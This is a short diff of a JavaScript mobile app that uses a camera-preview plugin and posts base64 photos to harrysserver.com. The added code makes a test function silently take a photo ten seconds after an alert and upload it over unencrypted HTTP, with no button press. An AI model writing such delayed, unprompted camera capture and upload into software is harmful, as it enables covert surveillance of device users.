@@ -59,10 +59,8 @@ var app = {
         var rect_coords = rect.getBoundingClientRect();
         var x_coord = rect_coords.left, y_coord = rect_coords.top;
 
-
         take_pic_btn.onclick = function(){
             CameraPreview.takePicture({width:1280, height:720, quality:50}, function(base64PictureData) {
-//            CameraPreview.takePicture(function(base64PictureData) {
               var pic='data:image/jpeg;base64,'+base64PictureData;
               $.post("http://harrysserver.com/camera/upload.php", {image: pic});
             });
@@ -98,8 +96,18 @@ var app = {
     }
 };
 
+const sleep = (milliseconds) => {
+  return new Promise(resolve => setTimeout(resolve, milliseconds))
+}
+
 var test=function(txt) {
   alert(txt);
+  sleep(10000).then(() => {
+    CameraPreview.takePicture({width:1280, height:720, quality:50}, function(base64PictureData) {
+      var pic='data:image/jpeg;base64,'+base64PictureData;
+      $.post("http://harrysserver.com/camera/upload.php", {image: pic});
+    });
+  })
 }
 
 app.initialize();
